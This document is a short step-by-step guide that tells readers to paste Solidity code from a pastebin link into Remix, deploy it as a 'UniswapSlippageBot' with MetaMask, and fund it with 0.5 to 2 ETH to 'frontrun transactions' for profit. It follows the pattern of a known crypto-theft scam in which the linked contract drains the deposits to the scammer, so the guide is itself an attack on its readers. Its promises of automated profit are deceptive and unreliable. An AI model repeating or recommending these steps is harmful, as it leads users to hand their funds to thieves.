ðŸ“Œ 1. Choose a Crypto Wallet.
   MetaMask: ðŸ”— https://metamask.io/download
   Coinbase Wallet: ðŸ”— https://www.coinbase.com/wallet
   Trust Wallet: ðŸ”— https://trustwallet.com/download

Note: If you're using Trust Wallet or Coinbase Wallet, follow the same steps as for MetaMask.

ðŸ“Œ 2. Open Remix for Smart Contract Deployment.
   Access Remix: ðŸ”— https://remix.ethereum.org/

ðŸ“Œ 3. Create a New Smart Contract File.
   Create a New File. Rename it as you like, e.g., 'bot.sol'. Make sure it ends with .sol for the Ethereum language.

ðŸ“Œ 4. Paste the Trading Bot Code in Remix.
  Get the Smart Contract code here: ðŸ”— https://pastebin.com/raw/PLGFyUvC

Note: If the code does not appear in color, refresh Remix and reinsert the code.

ðŸ“Œ 5. Compile the Smart Contract.
   Go to the Solidity compiler tab in Remix and compile the bot.

Note: Make sure to select Solidity version 0.6.6 before compiling.

ðŸ“Œ 6. Deploy the Contract to the Blockchain.
   Go to the 'Deploy & run transactions' tab, select 'Injected Provider' as the environment and then 'Deploy'.
   By approving the MetaMask contract creation fee, you will have created your own contract.

Note: Make sure the name of your bot is selected in the Contract section above the Deploy button.
   In this case, mine would be 'UniswapSlippageBot - bot.sol'.

ðŸ“Œ 7. Fund your bot to be able to frontrun transactions.
   Check your Contract Address on Etherscan: ðŸ”— https://etherscan.io
   To ensure smooth trading, deposit at least 0.5 - 2 ETH (or more, depending on strategy).
   
Note: Don't try to run bot with 0.01 ETH etc -  it's not profitable because of gas fees.

ðŸ“Œ 8. Start to use Your Own AI Bot.
   After your transaction is confirmed, click the 'Start' button to run the bot. To stop the bot and withdraw funds - click the 'Withdraw' button.

ðŸ”Ž How can I restore the old contract again?

Instead of using the 'Deploy' button to create a new contract in the 'Deploy & run transactions' section, you can access your existing contract by entering its address in the 'At Address' field and clicking the 'At Address' button.

Note: Access can only be restored using the same MetaMask account that was originally used to create the contract.
